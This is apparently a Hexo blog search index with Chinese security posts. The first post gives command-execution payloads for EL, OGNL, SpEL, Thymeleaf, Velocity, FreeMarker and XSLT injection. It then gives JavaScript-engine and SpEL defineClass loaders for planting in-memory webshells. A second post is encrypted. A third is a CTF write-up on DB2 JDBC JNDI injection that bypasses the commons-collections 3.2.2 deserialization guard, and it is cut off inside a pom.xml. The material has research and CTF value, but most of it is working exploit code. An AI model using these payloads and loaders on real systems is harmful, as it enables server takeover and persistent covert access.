<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>解析语言内存马注入(一)</title>
    <link href="/2024/03/01/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5(%E4%B8%80)/"/>
    <url>/2024/03/01/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h1 id="解析语言内存马注入-一"><a href="#解析语言内存马注入-一" class="headerlink" title="解析语言内存马注入(一)"></a>解析语言内存马注入(一)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在一直以来的漏洞挖掘和攻防过程中，我们会发现经常会出现表达式语言注入漏洞，而为了稳定获取权限就不可避免的需要注入内存马</p><h1 id="解析语言概述"><a href="#解析语言概述" class="headerlink" title="解析语言概述"></a>解析语言概述</h1><p>本文会测试使用的表达式语言基本都是常见的java表达式语言或常见模板，一共6种，如下所示：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">EL</span><br><span class="hljs-attribute">OGNL</span><br><span class="hljs-attribute">SPEL</span><br><span class="hljs-attribute">Thymeleaf</span><br><span class="hljs-attribute">Velocity</span><br><span class="hljs-attribute">FreeMarker</span><br></code></pre></td></tr></table></figure><h2 id="解析语言介绍"><a href="#解析语言介绍" class="headerlink" title="解析语言介绍"></a>解析语言介绍</h2><h3 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h3><p>EL表达式全名Expression Language，主要用于替换JSP页面中的脚本表达式，主要作用有获取数据、执行运算、获取web开发对象、调用Java方法</p><p>常见的命令执行的payload有：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>)<span class="hljs-selector-class">.getMethod</span>(<span class="hljs-string">&#x27;getRuntime&#x27;</span>)<span class="hljs-selector-class">.invoke</span>(null)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h3><p>OGNL是Object Graphic Navigation Language(对象图导航语言)的缩写，一个开源项目。Struts框架使用OGNL作为默认的表达式语言</p><p>常见的命令执行的payload有：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">(<span class="hljs-keyword">new</span> javax.script.<span class="hljs-constructor">ScriptEngineManager()</span>).get<span class="hljs-constructor">EngineByName(&#x27;<span class="hljs-params">js</span>&#x27;)</span>.eval(&#x27;java.lang.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)&#x27;)<br></code></pre></td></tr></table></figure><h3 id="SPEL表达式"><a href="#SPEL表达式" class="headerlink" title="SPEL表达式"></a>SPEL表达式</h3><p>Spring表达式语言（SpEL）是Spring框架的一部分，自Spring 3.0版本开始引入。SpEL的设计目标是提供一种通用的表达式语言，用于在Spring框架中进行各种配置和运行时处理。它被广泛用于Spring框架内的注解、XML配置、Spring Security等模块，为开发者提供了强大而灵活的表达式解析和求值能力</p><p>常见的命令执行的payload有：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#&#123;<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h3 id="Thymeleaf模板"><a href="#Thymeleaf模板" class="headerlink" title="Thymeleaf模板"></a>Thymeleaf模板</h3><p> Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与python web开发中的jinja模板引擎</p><p>常见的命令执行的payload有：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22calc</span><span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__::</span>.x<br></code></pre></td></tr></table></figure><h3 id="Velocity模板"><a href="#Velocity模板" class="headerlink" title="Velocity模板"></a>Velocity模板</h3><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象</p><p>常见的命令执行的payload有：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-variable">$x</span><span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="FreeMarker模板"><a href="#FreeMarker模板" class="headerlink" title="FreeMarker模板"></a>FreeMarker模板</h3><p>FreeMarker是一个基于Java的模板引擎，一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具</p><p>常见的命令执行的payload有：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?new()&gt;<span class="hljs-symbol">$</span>&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>).start()&#125;<br></code></pre></td></tr></table></figure><h1 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h1><h2 id="探寻通用的内存马注入方式"><a href="#探寻通用的内存马注入方式" class="headerlink" title="探寻通用的内存马注入方式"></a>探寻通用的内存马注入方式</h2><p>如此之多的表达式注入、模板注入，每一个的语法，结构都大相径庭，因此，在正是注入内存马之前，我需要一个可以统合各种语法的注入方式，在一番思索后，有两个很好的选择：<code>JsEngine</code>、<code>Spel</code>,通过调用解析引擎可以做到部分内容具有可移植性，已经是最好最方便的结果了</p><h3 id="JsEngine调用"><a href="#JsEngine调用" class="headerlink" title="JsEngine调用"></a>JsEngine调用</h3><p>就像2023年KCon中《Java表达式攻防下的黑魔法》一文中写到，Java有很多种表达式，不同表达式有不同的语法特点：有些必须要 用链式反射去调用方法，有些可以直接new；有些表达式只能执行一 句，有些可以执行多句</p><p>想要做到武器化利用就要选取一种通用的中间层语言，去延展我们的 利用链</p><p>其中JS引擎就非常符合我们的要求： </p><ol><li>一行代码即可调用JS引擎，在JS引擎中可以执行多句 </li><li>JDK6-14都可以使用，基本满足对兼容性的需要 </li><li>可以间接调用Java方法，实现任意代码执行</li></ol><p>因此，通过JS引擎可以扩展表达式的执行能力，甚至可以统一多种表达式的格式问题</p><p><strong>EL表达式</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-string">&quot;&quot;</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(&#x27;<span class="hljs-params">js</span>&#x27;)</span>.eval(&#x27;<span class="hljs-comment">/*js代码内容*/</span>&#x27;)<br></code></pre></td></tr></table></figure><p><strong>OGNL表达式</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(new javax<span class="hljs-selector-class">.script</span><span class="hljs-selector-class">.ScriptEngineManager</span>())<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&#x27;js&#x27;</span>)<span class="hljs-selector-class">.eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>SPEL表达式</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#&#123;new javax<span class="hljs-selector-class">.script</span><span class="hljs-selector-class">.ScriptEngineManager</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&#x27;js&#x27;</span>)<span class="hljs-selector-class">.eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Thymeleaf模板</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">__$%<span class="hljs-number">7</span>bnew%20java.util.Scanner(T(javax.script.ScriptEngineManager).getEngineByName(<span class="hljs-string">&#x27;js&#x27;</span>).<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><strong>Velocity模板</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-variable">$x</span><span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&#x27;javax.script.ScriptEngineManager&#x27;</span>)<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&#x27;js&#x27;</span>)<span class="hljs-selector-class">.eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>FreeMarker模板</strong></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;/*js代码内容*/&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p><strong>XSLT注入</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;?xml <span class="hljs-keyword">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;<br>&lt;xs<span class="hljs-variable">l:stylesheetversion</span>=<span class="hljs-string">&quot;1.0&quot;</span><br>xmln<span class="hljs-variable">s:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><br>xmln<span class="hljs-variable">s:rt</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span><br>xmln<span class="hljs-variable">s:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span>&gt;<br>&lt;xs<span class="hljs-variable">l:templatematch</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;<br>&lt;xs<span class="hljs-variable">l:variablename</span>=<span class="hljs-string">&quot;rtobject&quot;</span> select=<span class="hljs-string">&quot;rt:getRuntime()&quot;</span>/&gt;<br>&lt;xs<span class="hljs-variable">l:variablename</span>=<span class="hljs-string">&quot;process&quot;</span> select=<span class="hljs-string">&quot;rt:exec($rtobject,&#x27;calc&#x27;)&quot;</span>/&gt;<br>&lt;xs<span class="hljs-variable">l:variablename</span>=<span class="hljs-string">&quot;processString&quot;</span> select=<span class="hljs-string">&quot;ob:toString($process)&quot;</span>/&gt;<br>&lt;xs<span class="hljs-variable">l:value</span>-ofselect=<span class="hljs-string">&quot;$processString&quot;</span>/&gt;<br>&lt;/xs<span class="hljs-variable">l:template</span>&gt;<br>&lt;/xs<span class="hljs-variable">l:stylesheet</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="JsEngine注入内存马"><a href="#JsEngine注入内存马" class="headerlink" title="JsEngine注入内存马"></a>JsEngine注入内存马</h3><p>为了能够更加自由的实现加载字节码，于是这里需要引入<code>defineclass</code>,其通用性强和无需落地文件的特性使得许多人都推崇备至，虽然后续高版本Java会有些限制，但是无伤大雅，在这里不进行过多讨论，而且在某些层面，其实具备一些免杀效果，通过对上下文classloader获取的defineclass加载的filter为白名单</p><p>先通过深搜获取线程的<code>classloader</code>，再利用js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的，再利用classLoader获取到defineclass方法，利用definecalss加载字节码（下面是基础的注入，并未使用高版本绕过）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> classLoader = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">getContextClassLoader</span>();<span class="hljs-keyword">try</span>&#123;classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;/*注入器名称*/&#x27;</span>).<span class="hljs-title function_">newInstance</span>();&#125;<span class="hljs-keyword">catch</span> (e)&#123;<span class="hljs-keyword">var</span> clsString = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<span class="hljs-keyword">var</span> bytecodeBase64 = <span class="hljs-string">&#x27;/*内存马注入字节码*/&#x27;</span>;<span class="hljs-keyword">var</span> bytecode;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">var</span> clsBase64 = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.util.Base64&#x27;</span>);<span class="hljs-keyword">var</span> clsDecoder = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.util.Base64$Decoder&#x27;</span>);<span class="hljs-keyword">var</span> decoder = clsBase64.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;getDecoder&#x27;</span>).<span class="hljs-title function_">invoke</span>(base64Clz);bytecode = clsDecoder.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;decode&#x27;</span>, clsString).<span class="hljs-title function_">invoke</span>(decoder, bytecodeBase64);&#125; <span class="hljs-keyword">catch</span> (ee) &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-keyword">var</span> datatypeConverterClz = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;javax.xml.bind.DatatypeConverter&#x27;</span>);bytecode = datatypeConverterClz.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;parseBase64Binary&#x27;</span>, clsString).<span class="hljs-title function_">invoke</span>(datatypeConverterClz, bytecodeBase64);&#125; <span class="hljs-keyword">catch</span> (eee) &#123;<span class="hljs-keyword">var</span> clazz1 = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;sun.misc.BASE64Decoder&#x27;</span>);bytecode = clazz1.<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">decodeBuffer</span>(bytecodeBase64);&#125;&#125;<span class="hljs-keyword">var</span> clsClassLoader = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.lang.ClassLoader&#x27;</span>);<span class="hljs-keyword">var</span> clsByteArray = (<span class="hljs-keyword">new</span> java.<span class="hljs-property">lang</span>.<span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;a&#x27;</span>).<span class="hljs-title function_">getBytes</span>().<span class="hljs-title function_">getClass</span>());<span class="hljs-keyword">var</span> clsInt = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Integer</span>.<span class="hljs-property">TYPE</span>;<span class="hljs-keyword">var</span> defineClass = clsClassLoader.<span class="hljs-title function_">getDeclaredMethod</span>(<span class="hljs-string">&#x27;defineClass&#x27;</span>, [clsByteArray, clsInt, clsInt]);defineClass.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);<span class="hljs-keyword">var</span> clazz = defineClass.<span class="hljs-title function_">invoke</span>(classLoader,bytecode,<span class="hljs-keyword">new</span> java.<span class="hljs-property">lang</span>.<span class="hljs-title class_">Integer</span>(<span class="hljs-number">0</span>),<span class="hljs-keyword">new</span> java.<span class="hljs-property">lang</span>.<span class="hljs-title class_">Integer</span>(bytecode.<span class="hljs-property">length</span>));clazz.<span class="hljs-title function_">newInstance</span>();&#125;<br></code></pre></td></tr></table></figure><p>接下来就把这里的内容放到上面的内容里就行，注意双引号和引号的转义，注意注入器名称即可</p><h3 id="Spel调用"><a href="#Spel调用" class="headerlink" title="Spel调用"></a>Spel调用</h3><p><code>Spel</code>是Spring框架的一部分，所以在某些时候会同样适合去作为统一的字节码加载模板</p><p>同样通过调用defineclass去加载字节码，不过是通过<code>ReflectUtils</code>反射调用defineclass去加载字节码，spel的代码会短一些</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#&#123;<span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">cglib</span>.<span class="hljs-params">core</span>.ReflectUtils)</span>.define<span class="hljs-constructor">Class(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">*</span>注入器名称<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;,T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.Base64Utils)</span>.decode<span class="hljs-constructor">FromString(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">*</span>字节码<span class="hljs-params">base64</span>内容<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;)</span>,<span class="hljs-keyword">new</span> javax.management.loading.<span class="hljs-constructor">MLet(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">net</span>.URL[0],T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Thread)</span>.current<span class="hljs-constructor">Thread()</span>.get<span class="hljs-constructor">ContextClassLoader()</span>)).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>&#125;<br></code></pre></td></tr></table></figure><p>接下来就把这里的内容放到上面的内容里就行，注意双引号和引号的转义，注意注入器名称即可</p>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI注入挖掘</title>
    <link href="/2023/12/29/JNDI%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98/"/>
    <url>/2023/12/29/JNDI%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="38a007caf66d13137e18166a19483756f2fbe659b6bc86625117f2fddc53958f">1174717c597af3f1f1c4d977105602bd151e12487199d2f7ea49624d863dcb8ad5f940311bc61e71729d9d20c19b1b0bc9d83a398794af1d8fa7406a1a0f71bdd7eea37514eebb7551124c68c146a4e324e188483d38310d9356df1713f1d957977d719dac8e20d393f33877ffbffcb9bb8e87e3b52ce2d9460b36cf4546a33f6eb33f10deeb0af1df9539a4fc247b031e290a9c1e5869288ef38390970ae780e067a02d0f272444dee393050a99d04fc67d2caa9107c58a14028545055ea92b4d21bf6f5d0e3ec0632aa9e630955aa0aeb7dedf40011f5ec76c7de906f73ef359ed8fa7fad01531a8642c31821b75badec0cc717a301bdbd3bd2c768b083b5885ab5f81c51c4a1b0389923baf6089268756e9eae4894162ff458532599368de52e87145349655b08506873e7ba96d4e06f735851f76f88cca97b7cfbd2c0212f6a02103236fec68205d025e9684c175cd92c40441b6adc76814792a84c088c055a47bf6af5b73b7fb78c5aca4804c58deda4389387d5f2f1db63d6914ada29e8c31040c7e30715012e13a4856885bed51aa295b3538190f1cb1dda063b735339df01e4057dcff018d96443a13b7746035313c956b9a9f2b00e8c42478d930a8950ca65544251f56a0dfa5c491bcec4157f8e4fa90a8e0533ee841a7656df86d7b661d3d5e6a601f0ed39e707f54da07e23461137312e030885880392834b350bd44f8ed46a50b452180a518e10712c1031669cdfc4a57d4250426678822b8d4f5effca09eb471fccdc5f9f2d6c2e42be3fe3bee17f75c2630a353cd8a65f3f4dbffda509af4120506418e245f8bb8e59ec7823656db116e80cb138bcdc225a49f67fbf286e31306d7d162dbba34a295e450017a4ed68142965c58b88b912957dc3f7b20a763690fa74ead912a68dd760d417fdbe5fd7047d8b6ac835b63d4f372598066ab3af426db87dc9424d0149a5cb69fe2f389ce565c02dc6ce5f55ceff4728d587c6976aacfeb78a6591e9d7222b1c00087d5cf1dd379ac48315ba6ba3fc30efeefc5a74bb4f95aafbbe3a9b981b35567c0a138416ef8716210a74075850a84a24a3a280d654fbdee07aa9467671dd43c22a11b1ebe8a3d4994ba7fd5ada32495b4588c1eea0d71540c68cef0dcbeb1f38741fe26537db8508077993a0caf694a7696751f61436de8c4f3f94c7ecea1ea76d3178a2133f6609d4658dc46272228d71eb065bada2a3ebd239f52ca0bcc095972c1c0464898b705690839c13ef475e75a705cf48a0db65b4adfc30ed60bae18b5f89b3ca5e4994b3d6431</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java_JDBC(commonscollection3.2.2)Bypass</title>
    <link href="/2023/12/29/Java_JDBC(commonscollection3.2.2)Bypass/"/>
    <url>/2023/12/29/Java_JDBC(commonscollection3.2.2)Bypass/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-JDBC-commonscollection3-2-2-Bypass"><a href="#Java-JDBC-commonscollection3-2-2-Bypass" class="headerlink" title="Java_JDBC(commonscollection3.2.2)Bypass"></a>Java_JDBC(commonscollection3.2.2)Bypass</h1><h2 id="0x01-分析题目"><a href="#0x01-分析题目" class="headerlink" title="0x01 分析题目"></a>0x01 分析题目</h2><p>简单捋捋信息，访问题目得到一个连接测试页面</p><p><img src="/./../images/image-20231229144039463.png" alt="image-20231229144039463"></p><p>题目给出的附件如下：</p><p><img src="/./../images/image-20231229144142632.png" alt="image-20231229144142632"></p><p>不难看出考点是DB2的JNDI注入，DB2打JNDI的payload大致如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">jdbc:db2:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">50001</span><span class="hljs-regexp">/db:clientRerouteServerListJNDIName=ldap:/</span><span class="hljs-regexp">/127.0.0.1:1379/</span>abc<br></code></pre></td></tr></table></figure><p>但是反序列化依赖只有一个<code>commons-collections-3.2.2.jar</code>,理论上是要打CC3的链的，但是可以看得出来版本不对，该版本对CC3反序列化的类做了限制，导致重要的类不能够被反序列化，例如<code>InstantiateTransformer</code>，<code>InvokeTransformer</code></p><p>通过测试得知：</p><ul><li>由于Tomcat8.5.96测试发现TomcatByPass的工厂类org.apache.naming.factory.BeanFactory进行利用 是无法成功的，官方将其进行了修复，故无法利用 </li><li>由于RMI在6u132, 7u122, 8u113版本开始做了限制、LDAP在 11.0.1, 8u191, 7u201, 6u211版本开始 做了限制，故猜测是目标是采用了高版本的JDK</li></ul><p>这里只能去思考题目给出的其他依赖能不能破局了</p><p>给出的依赖中包含了commons-configuration、并且是tomcat部署，那么也存在tomcat-jdbc，查看相应的 Class： </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.jdbc</span><span class="hljs-selector-class">.naming</span>.GenericNamingResourcesFactory<span class="hljs-selector-id">#getObjectInstance</span> <br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20231229162215452.png" alt="image-20231229162215452"></p><p>该类可以进行加载类进行无参实例化，并且对setter方法进行调用 LDAP和RMI在收到服务端反序列化来的 <code>Reference</code> 对象后根据 <code>classFactory</code> 属性从<code>本地classpath</code>中 实例化一个 <code>ObjectFactory</code> 对象，然后调用这个对象的 <code>getObjectInstance</code> 方法 </p><p>该工厂类可以任意调用某类的setter方法，并且存在一个类： <code>org.apache.commons.configuration.Sys temConfiguration</code> </p><p>该类方法 <code>org.apache.commons.configuration.SystemConfiguration#setSystemProperties(java.lan g.String)</code> 可以进行远程加载配置文件进行设置系统属性：</p><p><img src="/./../images/image-20231229164918584.png" alt="image-20231229164918584"></p><p>分析到这个程度就好解决了，我们发现commons-collections3.2.2的反序列化限制是这样的</p><p>例如：<code>org.apache.commons.collections.functors.InstantiateTransformer#readObject</code></p><p><img src="/./../images/image-20231229192805661.png" alt="image-20231229192805661"></p><p>进入检测方法<code>org.apache.commons.collections.functors.FunctorUtils#checkUnsafeSerialization</code></p><p><img src="/./../images/image-20231229193233364.png" alt="image-20231229193233364">我们会发现检测时是在实时获取系统属性，如果不为 true 就会抛异常中断反序列化的执行</p><p>所以只需要修改这个作为JNDI注入缓解措施的系统属性，即可绕过高版本的限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.enableUnsafeSerialization=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>然后打CC3即可，芜湖</p><h2 id="0x02-搭建环境"><a href="#0x02-搭建环境" class="headerlink" title="0x02 搭建环境"></a>0x02 搭建环境</h2><p>为了以后复现简单，还是写了这么一个搭建环境的部分</p><p>首先是利用pom.xml导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- 使用最新的版本 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-configuration<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-configuration<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span 